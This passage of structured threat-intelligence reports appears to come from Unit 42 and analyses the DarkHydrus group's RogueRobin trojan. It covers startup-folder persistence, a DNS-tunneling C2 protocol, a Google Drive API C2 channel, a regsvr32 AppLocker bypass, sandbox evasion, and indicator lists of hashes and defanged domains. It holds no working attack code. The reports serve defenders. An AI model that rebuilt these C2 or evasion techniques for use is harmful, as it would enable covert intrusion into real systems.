                "To persistently execute when the system starts, the script will create the following shortcut in the Windows startup folder, which will run the OneDrive.ps1 script each time the user logs in:\n$env:SystemDrive\\Users\\$env:USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk\nThe payload itself communicates with its configured command and control (C2) servers using a custom DNS tunneling protocol.",
                "The domains configured within this payload are:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "The DNS tunneling protocol can use multiple different DNS query types to interact with the C2 server.",
                "The payload has a function it calls early on that tests to see which DNS query types are able to successfully reach the C2 server.",
                "It iterates through a list of types and the first DNS type to receive a response from the C2 server will be used for all communications between the payload and the C2 server, which are in the following order (editor's note: AC is not a\u00a0 DNS record type but is a mode where the trojan will perform a request for an A record requiring ac as a subdomain):"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The payload uses the built-in Windows nslookup application with specific parameters and specially crafted subdomains to communicate with the C2.",
                "To establish communications with the C2, the payload will first get a system specific identifier issued by the C2 server.",
                "The initial DNS query sent by the payload to obtain the system specific identifier uses the following structure, which includes the current process identifier (PID) as the subdomain of the C2 domain:\n<current process id>.<c2 domain>\nThe C2 server will provide the system specific identifier within the answer portion of the DNS response.",
                "Table 1 explains how the payload obtains the system identifier from the C2 servers answer depending on the query type:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 1 Breakdown of query types"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once the system identifier is obtained, the payload gathers system specific information and sends it to the C2 server.",
                "The information gathered is added to a string in the following structure:\n<IP address>|<computer name>|<domain>|<username>|<isAdmin flag>|<hasGarbage flag from config>|<hasStartup flag from config>|<\"hybrid\" mode flag from config>|<sleep interval from config>|<jitter value from config>\nThe payload will base64 encode this string and use its DNS tunneling protocol to transmit the data to the C2.",
                "The tunneling protocol transmits data by sending a series of DNS queries with the data within the subdomain of the C2 domain.",
                "The structure of each of these outbound DNS requests is as follows:\n<system ID>-<job ID>-<offset in data><more data flag>-<random length of base64 encoded data between 30 and 42 characters>.<c2 domain>\nThe payload will look for different responses to these outbound queries depending on the type of DNS request that the payload uses to communicate with the C2.",
                "The following shows the specific IP addresses or strings used by the C2 to transmit a success or cancel message depending on the type of DNS query used for C2 communications:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "After providing system specific information, the payload will Interact with the C2 server to obtain commands, which the payload refers to as jobs.",
                "The C2 will provide a string that the payload will use to determine the command to execute based on its command handler.",
                "To obtain strings to treat as commands, the payload will issue a series of DNS queries to resolve domains with the following structure:\n<system id>-<job ID>-<offset data specific to job>.<c2 domain>\nThe C2 server will provide responses to these queries that contain answers in IPv4 or IPv6 addresses depending on the type of DNS query the payload uses to communicate with its C2 server.",
                "The payload will use a specific regular expressions dependent on the type of DNS query was used to obtain the command string, which can be seen in Table 2:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Types of responses provided by C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "These regular expressions are used to build strings that the payload will then subject to its command handler.",
                "We analyzed the payload to determine the commands available, which provide a variety of remote administration capabilities.",
                "The command handle looks for the following command strings in Table 3:"
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 3 Commands available to payload"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Campaign Analysis\nThe following domains are configured within the payload to be used as C2s.",
                "Thematically, each domain appeared to be attempting to spoof the legitimate domain of an existing technology provider with an emphasis on security vendors."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system.",
                "These IPs provided insufficient data for additional investigations.",
                "However, each of the listed domains used ns102.kaspersky[.]host and ns103.kaspersky[.]host as their name servers.",
                "Examination of ns102/ns103.kaspersky[.]host revealed that the second level domain kaspersky[.]host was illegitimate and not owned by the legitimate Kaspersky Labs.",
                "Passive DNS resolution of kaspersky[.]host revealed two IPs of interest, 107.175.150[.]113 and 94.130.88[.]9.",
                "94.130.88[.]9 showed passive DNS resolutions of two additional domains, 0utlook[.]bid and hotmai1[.]com.",
                "It is unknown what these domains may have been used for but based on the similarity of domain spoofing and sharing an IP, they are likely part of the adversary infrastructure.",
                "107.175.150[.]113 showed one other domain resolution, <redacted>.0utl00k[.]net.",
                "We were able to link this specific domain as a C2 for another weaponized document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) containing a PowerShell script very similar to the one found in this attack.",
                "Examining the second level domain of 0utl00k[.]net revealed another IP of interest, 195.154.41[.]150.",
                "This IP contained two other domain resolutions following the vendor spoofing theme: allexa[.]net and cisc0[.]net.",
                "Expanding upon cisc0[.]net, we discovered several weaponized documents and payloads using this domain as a C2, from mid to late 2017.",
                "Open source intelligence provided by ClearSky Security indicates the domain cisc0[.]net is possibly related to the adversary group known as Copy Kittens.",
                "While there are significant tactical overlaps such as similarity of techniques used as well as victimology, we were unable to uncover significant evidence of relational overlaps.",
                "Further information regarding the Copy Kittens adversary can be found in a paper titled Operation Wilted Tulip.",
                "Our own dataset provides a solid grouping of the DarkHydrus group, with significant overlaps in C2 infrastructure as well as similarities in weaponized binaries.",
                "C2 domains were also left online and reused over an extended amount of time, such as the domain micrrosoft[.]net which was used in this attack in addition to two other payloads in January 2017 and July 2017.",
                "Studying the other samples, we have attributed to DarkHydrus, we are able to ascertain that this adversary has mainly leveraged weaponized Microsoft Office documents using tools available freely or from open source repositories such as Meterpreter, Mimikatz, PowerShellEmpire, Veil, and CobaltStrike.",
                "The documents generally do not contain malicious code and instead are weaponized to retrieve remote files containing malicious code on execution.",
                "Due to the modular nature of the delivery document, available data for analysis for these attacks are dependent upon the operational nature of the C2 server at the time of execution."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Conclusion\nThe DarkHydrus group carried out an attack campaign on at least one government agency in the Middle East using malicious .iqy files.",
                "The .iqy files take advantage of Excel's willingness to download and include the contents from a remote server in a spreadsheet.",
                "DarkHydrus leveraged this obscure file format to run a command to ultimately install a PowerShell scripts to gain backdoor access to the system.",
                "The PowerShell backdoor delivered in this current attack may have been custom developed by the threat group, however, it is possible that DarkHydrus pieced together this tool by using code from legitimate open source tools.",
                "Palo Alto Networks customers are protected by:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "IOC\nRelated SHA256 Hashes"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Payloads\ncec36e8ed65ac6f250c05b4a17c09f58bb80c19b73169aaf40fa15c8d3a9a6a1\nac7f9c536153780ccbec949f23b86f3d16e3105a5f14bb667df752aa815b0dc4\na547a02eb4fcb8f446da9b50838503de0d46f9bb2fd197c9ff63021243ea6d88\nd428d79f58425d831c2ee0a73f04749715e8c4dd30ccd81d92fe17485e6dfcda\ndd2625388bb2d2b02b6c10d4ee78f68a918b25ddd712a0862bcf92fa64284ffa\nb2571e3b4afbce56da8faa726b726eb465f2e5e5ed74cf3b172b5dd80460ad81\nc8b3d4b6acce6b6655e17255ef7a214651b7fc4e43f9964df24556343393a1a3\nce84b3c7986e6a48ca3171e703e7083e769e9ced1bbdd7edf8f3eab7ce20fd00\n99541ab28fc3328e25723607df4b0d9ea0a1af31b58e2da07eff9f15c4e6565c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Delivery documents\nd393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318\n8063c3f134f4413b793dfc05f035b6480aa1636996e8ac4b94646292a5f87fde\n9eac37a5c675cd1750cd50b01fc05085ce0092a19ba97026292a60b11b45bf49\ncf9b2b40ac621aaf3241ff570bd7a238f6402102c29e4fbba3c5ce0cb8bc25f9\n0a3d5b2a8ed60e0d96d5f0d9d6e00cd6ab882863afbb951f10c395a3d991fbc1\n0b1d5e17443f0896c959d22fa15dadcae5ab083a35b3ff6cb48c7f967649ec82\n870c8b29be2b596cc2e33045ec48c80251e668abd736cef9c5449df16cf2d3b8\nff0b59f23630f4a854448b82f1f0cd66bc4b1124a3f49f0aecaca28309673cb0\n01fd7992aa71f4dca3a3766c438fbabe9aea78ca5812ab75b5371b48bd2625e2\n6dcb3492a45a08127f9816a1b9e195de2bb7e0731c4e7168392d0e8068adae7a\n47b8ad55b66cdcd78d972d6df5338b2e32c91af0a666531baf1621d2786e7870\n776c056096f0e73898723c0807269bc299ae3bbd8e9542f0a1cbba0fd3470cb4\ncf7863e023475d695c6f72c471d314b8b1781c6e9087ff4d70118b30205da5f0\ne88045931b9d99511ce71cc94f2e3d1159581e5eb26d4e05146749e1620dc678\n26e641a9149ff86759c317b57229f59ac48c5968846813cafb3c4e87c774e245\nb5cfaac25d87a6e8ebabc918facce491788863f120371c9d00009d78b6a8c350\nad3fd1571277c7ce93dfbd58cee3b3bec84eeaf6bb29a279ecb6a656028f771c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Related Domains\nmaccaffe[.]com\ncisc0[.]net\n0utl00k[.]net\nmsdncss[.]com\n0ffice[.]com\n0ffiice[.]com\nmicrrosoft[.]net\nanyconnect[.]stream\nbigip[.]stream\n fortiweb[.]download\n kaspersky[.]science\n microtik[.]stream\n owa365[.]bid\n symanteclive[.]download\n windowsdefender[.]win\nallexa[.]net\nkaspersky[.]host\nhotmai1[.]com\n0utlook[.]bid"
            ]
        }
    ],
    "ef2e4f74f4228f50662af88886e0e007d3a79742": [
        {
            "type": "paragraph",
            "content": [
                "In the summer of 2018, Unit 42 released reporting regarding activity in the Middle East surrounding a cluster of activity using similar tactics, tools, and procedures (TTPs) in which we named the adversary group DarkHydrus.",
                "This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Since that initial reporting, we had not observed new activity from DarkHydrus until recently, when 360TIC published a tweet and subsequent research discussing delivery documents that appeared to be attributed to DarkHydrus.",
                "In the process of analyzing the delivery documents, we were able to collect additional associated samples, uncover additional functionality of the payloads including the use of Google Drive API, and confirm the strong likelihood of attribution to DarkHydrus.",
                "We have notified Google of our findings."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "We collected a total of three DarkHydrus delivery documents installing a new variant of the RogueRobin trojan.",
                "These three documents were extremely similar to each other and are all macro enabled Excel documents with .xlsm file extensions.",
                "None of the known documents contain a lure image or message to instruct the recipient to click the Enable Content button necessary to run the macro, as seen in Figure 1.",
                "While we cannot confirm the delivery mechanism, it is likely that the instructions to click the Enable Content button were provided during delivery, such as in the body of a spear-phishing email."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 1 DarkHydrus' delivery document does not have a lure image or message"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Without the delivery mechanism we cannot confirm the exact time these delivery documents were used in an attack; however, the observed timestamps within these three delivery documents gives us an idea when the DarkHydrus actors created them.",
                "While the creation times were timestomped to a default time of 2006-09-16 00:00:00Z commonly observed in malicious documents, the Last Modified times were still available and suggest that DarkHydrus created these documents in December 2018 and January 2019.",
                "Table 1 shows the breakdown of timestamps and their associated sample hashes."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 1 Timestamps of delivery documents"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The macro executes immediately after pressing the Enable Content button thanks to the Workbook_Open sub-function, which will call the actor created New_Macro function.",
                "The New_Macro function starts by concatenating several strings to create a PowerShell script that it will write to the file %TEMP%\\WINDOWSTEMP.ps1.",
                "The function builds the contents of a second file by concatenating several strings together, but this second file is a .sct file that the function will write to a file %TEMP%\\12-B-366.txt.",
                "While .sct files are used by a multitude of applications, in this instance it is being used as a Windows Script Component file.",
                "The function then uses the built-in Shell function to run the following command, which effectively executes the .sct file stored in 12-B-366.txt:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The use of the legitimate regsvr32.exe application to run a .sct file is an AppLocker bypass technique originally discovered by Casey Smith (@subtee), which eventually resulted in a Metasploit module.",
                "The WINDOWSTEMP.ps1 script is a dropper that decodes an embedded executable using base64 and decompresses it with the System.IO.Compression.GzipStream object.",
                "The script saves the decoded and decompressed executable to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and creates an LNK shortcut at %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk to persistently run WindowsTemplate.exe each time Windows starts up.",
                "The WindowsTemplate.exe executable is a new variant of RogueRobin written in C#."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In our original blog on DarkHydrus, we analyzed a PowerShell-based payload we named RogueRobin.",
                "While performing the analysis on the delivery documents using the .sct file AppLocker bypass, we noticed the C# payload was functionally similar to the original RogueRobin payload.",
                "The similarities between the PowerShell and C# variants of RogueRobin suggests that the DarkHydrus group ported their code to a compiled variant."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C# variant of RogueRobin attempts to detect if it is executing in a sandbox environment using the same commands as in the PowerShell variant of RogueRobin.",
                "The series of commands, as seen in Table 2, include checks for virtualized environments, low memory, and processor counts, in addition to checks for common analysis tools running on the system.",
                "The Trojan also checks to see if a debugger is attached to its processes and will exit if it detects the presence of a debugger."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 2 Sandbox evasion checks in the C# variant of RogueRobin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types.",
                "Just like in the sandbox checks, the Trojan checks for an attached debugger each time it issues a DNS query; if it does detect a debugger it will issue a DNS query to resolve 676f6f646c75636b.gogle[.]co.",
                "The domain is legitimate and owned by Google.",
                "The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck.",
                "This DNS query likely exists as a note to researchers or possibly as an anti-analysis measure, as it will only trigger if the researcher has already patched the initial debugger check to move onto the C2 function.",
                "Figure 2 shows the code responsible for detecting the attached debugger and issuing the corresponding DNS request."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 2 Code that issues DNS query to gogle.co if a debugger is detected"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response.",
                "Firstly, the Trojan will use the following regular expression to determine if the C2 server wishes to cancel the C2 communications:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Additionally, the RogueRobin Trojan uses the regular expressions in Table 3 to confirm that the DNS response contains the appropriate data for it to extract information from."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 3 Regular expressions used by RogueRobin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The C# variant, like its PowerShell relative, will issue DNS queries to determine which query types can successfully communicate with its C2 servers.",
                "Figure 3 shows the RogueRobin payload issuing DNS requests to resolve custom crafted subdomains of its C2 domains using TXT, SOA, MX, CNAME, SRV, A and AAAA query types."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 3 RogueRobin testing various DNS query types"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The domains in the test queries, such as aqhpc.akdns[.]live have subdomains that are generated by substituting the digits in the Trojans process ID with characters seen in Table 4 (for example qhp for the PID 908) and surrounding these characters with the static characters a and c. The C2 server can respond to any of the query types to provide a unique identifier value that the Trojan will store in a variable and use in future DNS requests."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 4 Character substitution used in RogueRobin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands.",
                "To obtain a job, the Trojan builds a subdomain that has the following structure and issues a DNS query to the C2 server:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c<unique identifier><job identifier padded with 0 to make three digits><sequence number>c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The generated subdomain is then subjected to a number-to-character substitution function that is the inverse of the Table 4, which effectively converts all the digits in the subdomain into characters.",
                "The Trojan checks the response to this query using the regular expressions in Table 3.",
                "If it received a non-cancelling response, the Trojan will extract data from the DNS responses and treat it as commands.",
                "Table 5 shows the commands that the C# variant of RogueRobin can handle, which is extremely similar to the previously analyzed PowerShell variant."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 5 Commands available within the C# variant of RogueRobin"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "A command that was not available in the original PowerShell variant of RogueRobin but is available with the new C# variant is the x_mode.",
                "This command is particularly interesting as it enables an alternative command and control channel that uses the Google Drive API.",
                "The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In x_mode, RogueRobin uploads a file to the Google Drive account and continually checks the file's modification time to see if the actor has made any changes to it.",
                "The actor will first modify the file to include a unique identifier that the Trojan will use for future communications.",
                "The Trojan will treat all subsequent changes to the file made by the actor as jobs and will treat them as commands, which it will handle with the same command handler seen in Table 5."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To use Google Drive, the x_mode command received from the C2 server via DNS tunneling will be followed by a newline-delimited list of settings needed to interact with the Google Drive account.",
                "Figure 4 shows the code in RogueRobin that handles the x_mode command, specifically splitting the command data on newlines and using the resulting array to set variables used as x_mode settings."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 4 x_mode command and new line delimited settings"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "As seen in Figure 4, the settings are stored in variables seen in Table 6, which are used to authenticate to the actor-controlled Google account before uploading and downloading files from Google Drive."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Table 6 Variables used to store settings needed to use Google Drive as a C2"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "To obtain an OAUTH access token to authenticate to the actor provided Google account, the Trojan sends an HTTP POST request to a URL stored in the gdo2t variable with grant_type, client_id, client_secret, and refresh_token fields added to the HTTP header and in the POST data.",
                "As seen in Figure 5, the values for these fields are set to variables initially set upon issuing of the x_mode command."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 HTTP POST request to obtain an OAUTH access token"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 5 shows that the Trojan then uses the following regular expression to obtain the access token from the HTTP response:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\\"access_token\\\":(.*)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Once authenticated with a valid access token, the Trojan will attempt to upload a file to the Google Drive account.",
                "To upload a file, the Trojan first creates an HTTP POST request to the URL stored in gduu to send the following JSON data to the Google Drive account:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "{ \"name\" : <process ID of Trojan>.txt }"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Google Drive will respond to this request with an HTTP response whose header contains a Location field.",
                "This field contains a URL that the Trojan will use to upload the contents of the <process ID of Trojan>.txt file, which will be structured as <process ID of Trojan>.<C2 domain> where the process ID is encoded with the same character substitution function as seen previously in Table 4.",
                "The Trojan will then use the following regular expression to check the HTTP response to the content upload request for the file identifier value:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\\"id\\\":(.*)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will use this file identifier value to monitor for changes made to the file by the actor by checking for changes to the modification time of the <process ID of Trojan>.txt file.",
                "The Trojan checks the modified time of the file by creating an HTTP request to a URL structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<Google Drive URL in gdu> + <file identifier> + \"?supportTeamDrives=true&fields=modifiedTime\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then uses the following regular expression to obtain the modified time of the file from the HTTP response, which is saved to the variable named modification_time:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\\"modifiedTime\\\":(.*)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan then uploads a second file to the Google Drive, the purpose of which is to allow the Trojan to continually write to this file as it waits for the actor to modify the first file uploaded.",
                "The Trojan will write <process ID of Trojan> to a second file stored on the Google Drive instance named <process ID of Trojan>-U.txt.",
                "In each iteration of the communications loop, the Trojan will check to see if the modification time of the first file changed, and if it is not updated the Trojan will update the second file by writing the string b<unique identifier>c<5 random lowercase characters>.<C2 domain> to the file by creating an HTTP POST request to a URL structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<Google Drive URL in gdue> + <second file identifier> + \"?supportsTeamDrive=true&uploadType=resumable&fields=kind,id,name,mimeType,parents\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "In one RogueRobin sample (SHA256: f1b2bc0831...), the author did not use the Google Drive URL provided by the actor when issuing the x_mode command, and instead included a hardcoded Google Drive URL, as seen in Figure 6.",
                "This is the only instance we observed where a hardcoded Google Drive URL was included in RogueRobin, which may suggest that the author may have overlooked this during testing."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Figure 6 Hardcoded Google Drive URL used in RogueRobin sample"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "When the modification_time for the first file changes, the Trojan downloads the contents from the first file uploaded to the Google Drive.",
                "The Trojan downloads the contents of this file by crafting an HTTP request to a URL structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<Google Drive URL in gdu> + <first file identifier> + \"?alt=media\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the contents of the file downloaded, the Trojan sets the modification_time variable to the current modification time so the Trojan knows when the actor makes further changes to the file.",
                "The Trojan processes the downloaded data the same way it would for a unique identifier as if the data was obtained via the DNS tunneling protocol using the TXT query mode, specifically by searching the data using the following regular expression:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "\\\"(\\\\w+).(<domainList[0]>|<domainList[1]>|<domainList[n]>).\\\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "With the unique identifier value obtained from the file on Google Drive, the Trojan will attempt to obtain jobs using the Google Drive communications channel.",
                "To get a job from the Google Drive account, the Trojan starts by creating a string that has the following structure with each element within the subdomain subjected to the number to character substitution from Table 4:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "c<unique identifier><job identifier padded with 0 to make three digits><sequence number>c.<C2 domain>"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan will then obtain an OAUTH access token to the Google Drive in the same manner as before when obtaining the unique identifier.",
                "The Trojan uses the access token to write the string above to the first file uploaded to Google drive whose filename is <process ID of Trojan>.txt.",
                "After writing to this file, the Trojan will enter a loop to continually to check for changes to the modification time of this file, effectively waiting for the actor to make modifications to the file.",
                "When the actor modifies the file and changes the modification_time, the Trojan downloads the contents from the file by creating an HTTP request to a URL structured as follows:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "<Google Drive URL in gdu> + <file identifier in 'f_id'> + \"?alt=media\""
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan processes the downloaded data within the file the same way it would to obtain a job from data received from the DNS tunneling channel using the TXT query mode, specifically by searching the data using the following regular expression:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "([^r-v\\\\s]+)[r-v]([\\\\w\\\\d+\\\\/=]+).(<domainList[0]>|<domainList[1]>|<domainList[n]>)"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The Trojan function splits the matching data, specifically the subdomain on a separator that is a character between r and v and uses the data before the separator to get the sequence number and a Boolean value (0 or 1) if more data is expected.",
                "It will use the data after the separator as the string that it will subject to the command handler seen in Table 5."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The initial list of C2 domains released by 360TIC associated with 513813af15... appeared thematically very similar to previous DarkHydrus activity, using domain names visually similar to well-known technology vendors or service providers.",
                "This list was further expanded upon by ClearSky Security (here, here and here) in a series of tweets that provided additional similar domain names also likely linked to DarkHydrus.",
                "To better understand how these domains are related to DarkHydrus, we began visually mapping the relationships between the list of domains, which can be seen in Figure 7.",
                "The diagram shows the DarkHydrus group using a consistent naming schema and structure in their infrastructure.",
                "They register a multitude of domains and set up nameservers to use as their primary DNS for their C2 domains."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Figure 7 Relational diagram of DarkHydrus infrastructure"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "For this campaign, we are able to cluster the adversary infrastructure via the specific nameservers that were deployed for C2s.",
                "The brackets in Figure 7 shows the distinct clustering of infrastructure into three groups.",
                "We were able to retrieve live payloads associated with two of the clusters.",
                "A third cluster was also shared by ClearSky Security, but we were unable to associate a live payload to them.",
                "Although the third cluster does not appear to have any direct relationships to the other two clusters, it is still highly probable that this cluster is related to the two other clusters via the structuring of domains with custom nameservers.",
                "In addition, the domain names themselves were extremely similar, with some examples being exactly the same but on a different top level domain."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The two sets of nameservers we were able to associate with the retrieved payloads were tbs1/tbs2.microsoftonline.services and tvs1/tvs2.trafficmanager.live.",
                "The distribution of C2 domains and their nameservers can be seen in Table 7."
            ]
        },
        {
            "type": "caption",
            "content": [
                "Table 7: Sample and Domain Associations"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The third cluster of domains had six different nameservers associated with them, but unlike the other two clusters, were all directly tied to each other.",
                "Each of the domains appeared to have rotated through the six nameservers but oddly, one of the nameservers that several of the domains had rotated through did not appear to be currently registered.",
                "Examining historical IP resolutions revealed a common IP between the active nameservers, 107.175.75[.]123.",
                "This IP is of particular interest as historical domain resolutions of this IP revealed that it had resolved to the domain hotmai1l[.]com in the past as well, which was a domain we had previously identified as having a high likelihood of association with DarkHydrus infrastructure.",
                "This IP also belongs to the same service provider and class B network range as another IP we had associated with DarkHydrus, 107.175.150[.]113 which specifically resolved to a domain name containing a victim organizations name."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "The DarkHydrus group continues their operations and adds new techniques to their playbook.",
                "Recent DarkHydrus delivery documents revealed the group abusing open-source penetration testing techniques such as the AppLocker bypass.",
                "The payloads installed by these delivery documents show that the DarkHydrus actors ported their previous PowerShell-based RogueRobin code to an executable variant, which is behavior that has been commonly observed with other adversary groups operating in the Middle East, such as OilRig.",
                "Lastly, the new variant of RogueRobin is capable of using the Google Drive cloud service for its C2 channel, suggesting that DarkHydrus may be shifting to abusing legitimate cloud services for their infrastructure."
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "Palo Alto Networks customers are already be protected via:"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "513813af1590bc9edeb91845b454d42bbce6a5e2d43a9b0afa7692e4e500b4c8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "e068c6536bf353abe249ad0464c58fb85d7de25223442dd220d64116dbf1e022"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "4e40f80114e5bd44a762f6066a3e56ccdc0d01ab2a18397ea12e0bc5508215b8"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "eb33a96726a34dd60b053d3d1048137dffb1bba68a1ad6f56d33f5d6efb12b97"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "f1b2bc0831445903c0d51b390b1987597009cc0fade009e07d792e8d455f6db0"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "5cc62ad6baf572dbae925f701526310778f032bb4a54b205bada78b1eb8c479c"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "akdns[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "akamaiedge[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "edgekey[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "akamaized[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0ffice365[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0nedrive[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "corewindows[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "microsoftonline[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "onedrive[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "sharepoint[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "skydrive[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0ffice365[.]life"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "0ffice365[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "skydrive[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "skydrive[.]agency"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tvs1.trafficmanager[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tvs2.trafficmanager[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tbs1.microsoftonline[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "tbs2.microsoftonline[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "brit.ns.cloudfronts[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "dns.cloudfronts[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2.akadns[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "britns.akadns[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "britns.akadns[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "ns2.akadns[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "iecvlist-microsoft[.]live"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "data-microsoft[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "asimov-win-microsoft[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "onecs-live[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "akamaiedge[.]services"
            ]
        },
        {
            "type": "paragraph",
            "content": [
                "phicdn[.]world"
            ]
        },
        {
            "type": "paragraph",
